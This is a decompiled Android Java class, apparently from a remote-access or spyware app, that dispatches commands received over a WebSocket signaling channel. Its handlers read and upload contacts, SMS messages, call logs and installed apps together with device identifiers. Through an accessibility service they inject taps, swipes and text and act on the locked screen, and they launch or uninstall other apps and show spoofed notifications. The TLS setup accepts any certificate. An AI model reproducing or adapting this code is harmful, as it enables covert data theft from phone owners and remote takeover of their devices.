package defpackage;

import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.text.TextUtils;
import android.util.Base64;
import androidx.work.Configuration;
import androidx.work.impl.WorkDatabaseVersions;
import androidx.work.impl.WorkManagerImpl;
import com.mamimobi.AccessService;
import com.mamimobi.activity.PermissionsRequestActivity;
import com.mamimobi.videostream.NotificationActivity;
import com.mamimobi.videostream.UninstallProxyActivity;
import com.mamimobi.videostream.model.DeviceType;
import com.mamimobi.videostream.model.Event;
import com.mamimobi.videostream.model.Message;
import com.mamimobi.videostream.model.MessageType;
import com.mamimobi.videostream.model.OfferOrAnswerMessage;
import com.mamimobi.videostream.model.SignalingMessage;
import com.mamimobi.videostream.model.User;
import com.mamimobi.videostream.model.WebCandidate;
import io.nats.client.BaseConsumeOptions;
import io.nats.client.Options;
import io.nats.client.support.ApiConstants;
import io.nats.client.support.JsonUtils;
import io.nats.client.support.NatsConstants;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import java.util.Map;
import java.util.Objects;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.zip.GZIPOutputStream;
import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import org.json.JSONArray;
import org.json.JSONObject;
import org.webrtc.IceCandidate;
import org.webrtc.PeerConnection;
import org.webrtc.SessionDescription;

/* JADX INFO: loaded from: classes.dex */
public final class lm0 {
    public static String m;
    public static String n;
    public km0 a;
    public final Context c;
    public final k71 d;
    public final vl0 h;
    public final m20 b = new m20();
    public String e = null;
    public final Handler f = new Handler(Looper.getMainLooper());
    public final AtomicBoolean g = new AtomicBoolean(false);
    public final AtomicBoolean i = new AtomicBoolean(false);
    public volatile long j = 0;
    public final ExecutorService k = Executors.newSingleThreadExecutor();
    public final f l = new f(20, this);

    static {
        StringBuilder sb = new StringBuilder("{\"id\":\"");
        sb.append(MessageType.PING.getType());
        sb.append("\",\"deviceType\":");
        DeviceType deviceType = DeviceType.PHONE;
        sb.append(deviceType.getType());
        sb.append(JsonUtils.CLOSE);
        m = sb.toString();
        n = "{\"id\":\"" + MessageType.PONG.getType() + "\",\"deviceType\":" + deviceType.getType() + JsonUtils.CLOSE;
    }

    public lm0(Context context, k71 k71Var) {
        this.c = context.getApplicationContext();
        this.d = k71Var;
        String strV = t40.V(context);
        StringBuilder sb = new StringBuilder("{\"id\":\"");
        sb.append(MessageType.PING.getType());
        sb.append("\",\"name\":\"");
        sb.append(strV);
        sb.append("\",\"deviceType\":");
        DeviceType deviceType = DeviceType.PHONE;
        sb.append(deviceType.getType());
        sb.append(JsonUtils.CLOSE);
        m = sb.toString();
        n = "{\"id\":\"" + MessageType.PONG.getType() + "\",\"name\":\"" + strV + "\",\"deviceType\":" + deviceType.getType() + JsonUtils.CLOSE;
        vl0 vl0Var = new vl0();
        vl0Var.a = 1.0d;
        vl0Var.b = "unknown";
        vl0Var.c = 15000.0d;
        vl0Var.d = 0L;
        this.h = vl0Var;
    }

    public static void a(lm0 lm0Var, MessageType messageType, Event event) throws PackageManager.NameNotFoundException {
        String str;
        o71 o71Var;
        PeerConnection peerConnection;
        lm0Var.getClass();
        int i = jm0.a[messageType.ordinal()];
        if (i == 1) {
            k71 k71Var = lm0Var.d;
            new Message(messageType);
            k71Var.getClass();
            return;
        }
        try {
            switch (i) {
                case 4:
                    k71 k71Var2 = lm0Var.d;
                    new User(event.getSignaling().id, event.getSignaling().name);
                    k71Var2.getClass();
                    return;
                case 5:
                    lm0Var.d.f(event.getSignaling());
                    return;
                case 6:
                    k71 k71Var3 = lm0Var.d;
                    String str2 = event.getSignaling().name;
                    String str3 = event.getSignaling().sdpOffer;
                    k71Var3.getClass();
                    return;
                case 7:
                    k71 k71Var4 = lm0Var.d;
                    String str4 = event.getSignaling().name;
                    k71Var4.d(event.getSignaling().sdpAnswer);
                    return;
                case 8:
                    WebCandidate webCandidate = event.getSignaling().candidate;
                    k71 k71Var5 = lm0Var.d;
                    String str5 = event.getSignaling().name;
                    k71Var5.e(new IceCandidate(webCandidate.sdpMid, webCandidate.sdpMLineIndex, webCandidate.candidate));
                    return;
                case WorkDatabaseVersions.VERSION_9 /* 9 */:
                    lm0Var.d.g(event.getSignaling());
                    return;
                case 10:
                    k71 k71Var6 = lm0Var.d;
                    k71Var6.getClass();
                    return;
                case WorkDatabaseVersions.VERSION_11 /* 11 */:
                    km0 km0Var = lm0Var.a;
                    if (km0Var == null || !km0Var.isOpen()) {
                        return;
                    }
                    if (!n.contains(ApiConstants.NAME)) {
                        n = "{\"id\":\"" + MessageType.PONG.getType() + "\",\"name\":\"" + t40.V(lm0Var.c) + "\",\"deviceType\":" + DeviceType.PHONE.getType() + JsonUtils.CLOSE;
                    }
                    lm0Var.f.post(new p7(lm0Var, 11, new im0(lm0Var, 2)));
                    return;
                case WorkDatabaseVersions.VERSION_12 /* 12 */:
                    lm0Var.h.a();
                    return;
                case WorkDatabaseVersions.VERSION_13 /* 13 */:
                    lm0Var.d.a(event.getSignaling());
                    return;
                case WorkDatabaseVersions.VERSION_14 /* 14 */:
                    k71 k71Var7 = lm0Var.d;
                    SignalingMessage signaling = event.getSignaling();
                    k71Var7.getClass();
                    Map<String, Object> map = signaling.payload;
                    Object obj = map.get("x");
                    Objects.requireNonNull(obj);
                    String string = obj.toString();
                    Object obj2 = map.get("y");
                    Objects.requireNonNull(obj2);
                    String string2 = obj2.toString();
                    AccessService accessService = AccessService.e0;
                    if (accessService != null) {
                        d91.j(accessService, Math.round(Float.parseFloat(string)), Math.round(Float.parseFloat(string2)));
                        return;
                    }
                    return;
                case WorkDatabaseVersions.VERSION_15 /* 15 */:
                    k71 k71Var8 = lm0Var.d;
                    SignalingMessage signaling2 = event.getSignaling();
                    k71Var8.getClass();
                    Map<String, Object> map2 = signaling2.payload;
                    try {
                        Object obj3 = map2.get("start");
                        Objects.requireNonNull(obj3);
                        JSONObject jSONObject = new JSONObject(obj3.toString());
                        Object obj4 = map2.get("end");
                        Objects.requireNonNull(obj4);
                        JSONObject jSONObject2 = new JSONObject(obj4.toString());
                        AccessService accessService2 = AccessService.e0;
                        if (accessService2 != null) {
                            d91.k(accessService2, Math.round(jSONObject.getDouble("x")), Math.round(jSONObject.getDouble("y")), Math.round(jSONObject2.getDouble("x")), Math.round(jSONObject2.getDouble("y")));
                            return;
                        }
                        return;
                    } catch (Exception unused) {
                        return;
                    }
                case 16:
                    lm0Var.d.c(event.getSignaling());
                    return;
                case 17:
                    try {
                        if (!f11.b(lm0Var.c, "android.permission.READ_CONTACTS")) {
                            Intent intent = new Intent(lm0Var.c, (Class<?>) PermissionsRequestActivity.class);
                            intent.putExtra("extra_permissions", new String[]{"android.permission.READ_CONTACTS"});
                            intent.addFlags(872415232);
                            lm0Var.c.startActivity(intent);
                            return;
                        }
                        JSONObject jSONObject3 = new JSONObject();
                        jSONObject3.put("android", t40.V(lm0Var.c));
                        jSONObject3.put(ApiConstants.ACTION, "readContacts");
                        jSONObject3.put("manufacturer", Build.MANUFACTURER);
                        jSONObject3.put("brand", Build.BRAND);
                        jSONObject3.put("model", Build.MODEL);
                        o71 o71VarF = o71.f(lm0Var.c);
                        if (o71VarF.e() != null) {
                            jSONObject3.put("clientid", o71VarF.e());
                        }
                        JSONArray jSONArrayE0 = qm.e0(lm0Var.c);
                        is.L = false;
                        is.k(f11.a(jSONObject3.toString().getBytes()), f11.a(jSONArrayE0.toString().getBytes()));
                        return;
                    } catch (Exception e) {
                        e.printStackTrace();
                        return;
                    }
                case 18:
                    try {
                        if (!f11.b(lm0Var.c, "android.permission.READ_SMS")) {
                            Intent intent2 = new Intent(lm0Var.c, (Class<?>) PermissionsRequestActivity.class);
                            intent2.putExtra("extra_permissions", new String[]{"android.permission.READ_SMS"});
                            intent2.addFlags(872415232);
                            lm0Var.c.startActivity(intent2);
                            return;
                        }
                        JSONObject jSONObject4 = new JSONObject();
                        jSONObject4.put("android", t40.V(lm0Var.c));
                        jSONObject4.put(ApiConstants.ACTION, "readSms");
                        jSONObject4.put("manufacturer", Build.MANUFACTURER);
                        jSONObject4.put("brand", Build.BRAND);
                        jSONObject4.put("model", Build.MODEL);
                        o71 o71VarF2 = o71.f(lm0Var.c);
                        if (o71VarF2.e() != null) {
                            jSONObject4.put("clientid", o71VarF2.e());
                        }
                        JSONArray jSONArrayF0 = qm.f0(lm0Var.c);
                        is.L = false;
                        is.k(f11.a(jSONObject4.toString().getBytes()), f11.a(jSONArrayF0.toString().getBytes()));
                        return;
                    } catch (Exception e2) {
                        e2.printStackTrace();
                        return;
                    }
                case 19:
                    try {
                        if (!f11.b(lm0Var.c, "android.permission.READ_CALL_LOG")) {
                            Intent intent3 = new Intent(lm0Var.c, (Class<?>) PermissionsRequestActivity.class);
                            intent3.putExtra("extra_permissions", new String[]{"android.permission.READ_CALL_LOG"});
                            intent3.addFlags(872415232);
                            lm0Var.c.startActivity(intent3);
                            return;
                        }
                        JSONObject jSONObject5 = new JSONObject();
                        jSONObject5.put("android", t40.V(lm0Var.c));
                        jSONObject5.put(ApiConstants.ACTION, "readCallLogs");
                        jSONObject5.put("manufacturer", Build.MANUFACTURER);
                        jSONObject5.put("brand", Build.BRAND);
                        jSONObject5.put("model", Build.MODEL);
                        o71 o71VarF3 = o71.f(lm0Var.c);
                        if (o71VarF3.e() != null) {
                            jSONObject5.put("clientid", o71VarF3.e());
                        }
                        JSONArray jSONArrayD0 = qm.d0(lm0Var.c);
                        is.L = false;
                        is.k(f11.a(jSONObject5.toString().getBytes()), f11.a(jSONArrayD0.toString().getBytes()));
                        return;
                    } catch (Exception e3) {
                        e3.printStackTrace();
                        return;
                    }
                case Configuration.MIN_SCHEDULER_LIMIT /* 20 */:
                    try {
                        JSONObject jSONObject6 = new JSONObject();
                        jSONObject6.put("android", t40.V(lm0Var.c));
                        jSONObject6.put(ApiConstants.ACTION, "getInstalledApps");
                        jSONObject6.put("manufacturer", Build.MANUFACTURER);
                        jSONObject6.put("brand", Build.BRAND);
                        jSONObject6.put("model", Build.MODEL);
                        o71 o71VarF4 = o71.f(lm0Var.c);
                        if (o71VarF4.e() != null) {
                            jSONObject6.put("clientid", o71VarF4.e());
                        }
                        JSONArray jSONArrayD = qm.D(lm0Var.c);
                        is.L = false;
                        is.k(f11.a(jSONObject6.toString().getBytes()), f11.a(jSONArrayD.toString().getBytes()));
                        return;
                    } catch (Exception e4) {
                        e4.printStackTrace();
                        return;
                    }
                case 21:
                    SignalingMessage signaling3 = event.getSignaling();
                    lm0Var.c.getPackageManager().getPackageInfo(signaling3.name, 0);
                    AccessService.I0.set(true);
                    AccessService.N0 = signaling3.text;
                    Context context = lm0Var.c;
                    String str6 = signaling3.name;
                    try {
                        Intent intent4 = new Intent(context, (Class<?>) UninstallProxyActivity.class);
                        intent4.putExtra("packageName", str6);
                        intent4.setFlags(268435456);
                        intent4.addFlags(Options.DEFAULT_RECONNECT_BUF_SIZE);
                        intent4.addFlags(536870912);
                        context.startActivity(intent4);
                        return;
                    } catch (Exception e5) {
                        e5.printStackTrace();
                        return;
                    }
                case WorkManagerImpl.MAX_PRE_JOB_SCHEDULER_API_LEVEL /* 22 */:
                    SignalingMessage signaling4 = event.getSignaling();
                    lm0Var.c.getPackageManager().getPackageInfo(signaling4.name, 0);
                    Intent launchIntentForPackage = lm0Var.c.getPackageManager().getLaunchIntentForPackage(signaling4.name);
                    if (launchIntentForPackage != null) {
                        launchIntentForPackage.addFlags(805339136);
                        lm0Var.c.startActivity(launchIntentForPackage);
                        return;
                    }
                    return;
                case WorkManagerImpl.MIN_JOB_SCHEDULER_API_LEVEL /* 23 */:
                    SignalingMessage signaling5 = event.getSignaling();
                    try {
                        String str7 = signaling5.name;
                        String str8 = signaling5.text;
                        String str9 = signaling5.key;
                        String str10 = signaling5.sender;
                        Intent intent5 = new Intent(lm0Var.c, (Class<?>) NotificationActivity.class);
                        intent5.putExtra("title", str7);
                        intent5.putExtra("icon", str8);
                        intent5.putExtra("content", str9);
                        intent5.putExtra("pkgname", str10);
                        intent5.addFlags(872415232);
                        lm0Var.c.startActivity(intent5);
                        return;
                    } catch (Exception e6) {
                        e6.printStackTrace();
                        return;
                    }
                case 24:
                    fa0.Q0(lm0Var.c, "pushurl", event.getSignaling().name);
                    return;
                case BaseConsumeOptions.DEFAULT_THRESHOLD_PERCENT /* 25 */:
                    lm0Var.d.b(event.getSignaling());
                    return;
                case 26:
                    k71 k71Var9 = lm0Var.d;
                    SignalingMessage signaling6 = event.getSignaling();
                    k71Var9.getClass();
                    String str11 = signaling6.text;
                    k71Var9.c.j = signaling6.sender;
                    AccessService accessService3 = AccessService.e0;
                    if (accessService3 != null) {
                        accessService3.u(str11);
                        return;
                    }
                    return;
                case 27:
                    k71 k71Var10 = lm0Var.d;
                    SignalingMessage signaling7 = event.getSignaling();
                    synchronized (k71Var10) {
                        try {
                        } catch (Exception unused2) {
                        } catch (Throwable th) {
                            throw th;
                        }
                        if (AccessService.b0.isKeyguardLocked()) {
                            long jCurrentTimeMillis = System.currentTimeMillis();
                            o71 o71Var2 = k71Var10.c;
                            if (jCurrentTimeMillis - o71Var2.p < 1000) {
                                return;
                            }
                            o71Var2.p = jCurrentTimeMillis;
                            o71Var2.j = signaling7.sender;
                            String str12 = signaling7.type;
                            if (TextUtils.isEmpty(signaling7.text) || signaling7.text.equals("[]")) {
                                AccessService.j0.set(false);
                                if (((PowerManager) k71Var10.b.getSystemService("power")).isInteractive()) {
                                    AccessService.a1.postDelayed(new h71(k71Var10, 0), 3000L);
                                } else {
                                    o80.j0(k71Var10.b);
                                    Handler handler = AccessService.a1;
                                    handler.postDelayed(new l1(15), 600L);
                                    handler.postDelayed(new h71(k71Var10, 1), 3000L);
                                }
                            } else {
                                AccessService.j0.set(false);
                                if (!((PowerManager) k71Var10.b.getSystemService("power")).isInteractive()) {
                                    o80.j0(k71Var10.b);
                                    AccessService.a1.postDelayed(new l1(21), 1000L);
                                }
                                AccessService.a1.postDelayed(new i71(str12, signaling7, k71Var10.b, 1), 3000L);
                            }
                            return;
                        }
                        return;
                    }
                case 28:
                    k71 k71Var11 = lm0Var.d;
                    SignalingMessage signaling8 = event.getSignaling();
                    k71Var11.getClass();
                    if (signaling8 == null || (str = signaling8.type) == null || !"disconnected".equals(str) || (peerConnection = (o71Var = k71Var11.c).c) == null || peerConnection.signalingState() == PeerConnection.SignalingState.CLOSED || k71Var11.a) {
                        return;
                    }
                    k71Var11.a = true;
                    o71Var.g();
                    new Handler(Looper.getMainLooper()).postDelayed(new h71(k71Var11, 2), 1000L);
                    return;
                case 29:
                    k71 k71Var12 = lm0Var.d;
                    SignalingMessage signaling9 = event.getSignaling();
                    k71Var12.getClass();
                    try {
                        if (!signaling9.state) {
                            AccessService.Q0.remove(signaling9.name);
                        } else if (!p9.b(signaling9.name)) {
                            AccessService.Q0.add(signaling9.name);
                        }
                        return;
                    } catch (Exception e7) {
                        e7.printStackTrace();
                        return;
                    }
                case 30:
                    k71 k71Var13 = lm0Var.d;
                    SignalingMessage signaling10 = event.getSignaling();
                    k71Var13.getClass();
                    try {
                        if (!signaling10.state) {
                            AccessService.R0.remove(signaling10.name);
                        } else if (!p9.b(signaling10.name)) {
                            AccessService.R0.add(signaling10.name);
                            f71.a.add(signaling10.name);
                        }
                        return;
                    } catch (Exception e8) {
                        e8.printStackTrace();
                        return;
                    }
                case 31:
                    k71 k71Var14 = lm0Var.d;
                    SignalingMessage signaling11 = event.getSignaling();
                    k71Var14.getClass();
                    try {
                        if (signaling11.state) {
                            AccessService.S0.add(signaling11.name);
                        } else {
                            AccessService.S0.remove(signaling11.name);
                        }
                        return;
                    } catch (Exception e9) {
                        e9.printStackTrace();
                        return;
                    }
                default:
                    return;
            }
        } catch (PackageManager.NameNotFoundException | Exception unused3) {
        }
    }

    public final void b(String str) {
        int i = 0;
        Handler handler = this.f;
        AtomicBoolean atomicBoolean = this.i;
        if (atomicBoolean.get()) {
            return;
        }
        km0 km0Var = this.a;
        if (km0Var != null && km0Var.isOpen()) {
            if (str.equals(this.e)) {
                return;
            }
            handler.removeCallbacks(this.l);
            km0 km0Var2 = this.a;
            if (km0Var2 != null) {
                km0Var2.close();
                this.a = null;
            }
        }
        atomicBoolean.set(true);
        try {
            this.e = str;
            this.a = new km0(this, new URI(str));
            if (str.startsWith(NatsConstants.SECURE_WEBSOCKET_PROTOCOL)) {
                try {
                    SSLContext sSLContext = SSLContext.getInstance("TLS");
                    sSLContext.init(null, new TrustManager[]{new i(2)}, new SecureRandom());
                    this.a.setSocketFactory(sSLContext.getSocketFactory());
                } catch (Exception unused) {
                }
            }
            this.a.setConnectionLostTimeout(180);
            this.a.connect();
        } finally {
            handler.postDelayed(new im0(this, i), 5000L);
        }
    }

    public final void c(byte[] bArr) {
        km0 km0Var = this.a;
        if (km0Var == null || !km0Var.isOpen()) {
            return;
        }
        this.f.post(new p7(this, 11, new p7(this, 10, bArr)));
    }

    public final void d(String str, PeerConnection.IceConnectionState iceConnectionState) {
        SignalingMessage signalingMessage = new SignalingMessage();
        signalingMessage.id = MessageType.ICESTATE.getType();
        signalingMessage.name = str;
        signalingMessage.type = iceConnectionState.name();
        signalingMessage.deviceType = DeviceType.PHONE.getType();
        e(signalingMessage);
    }

    public final void e(Object obj) {
        km0 km0Var = this.a;
        if (km0Var == null || !km0Var.isOpen()) {
            return;
        }
        this.f.post(new p7(this, 11, new p7(this, 12, this.b.f(obj))));
    }

    public final void f(String str, SessionDescription sessionDescription) throws IOException {
        OfferOrAnswerMessage offerOrAnswerMessage = new OfferOrAnswerMessage();
        offerOrAnswerMessage.id = MessageType.OFFER.getType();
        offerOrAnswerMessage.sender = str;
        String str2 = sessionDescription.description;
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        GZIPOutputStream gZIPOutputStream = new GZIPOutputStream(byteArrayOutputStream);
        gZIPOutputStream.write(str2.getBytes(StandardCharsets.UTF_8));
        gZIPOutputStream.close();
        offerOrAnswerMessage.sdpOffer = Base64.encodeToString(byteArrayOutputStream.toByteArray(), 2);
        e(offerOrAnswerMessage);
    }

    public final void g() {
        if (o80.K(this.c)) {
            long jCurrentTimeMillis = System.currentTimeMillis();
            if (jCurrentTimeMillis - this.j >= 5000 && this.g.compareAndSet(false, true)) {
                this.j = jCurrentTimeMillis;
                this.f.postDelayed(new im0(this, 1), 3000L);
            }
        }
    }
}
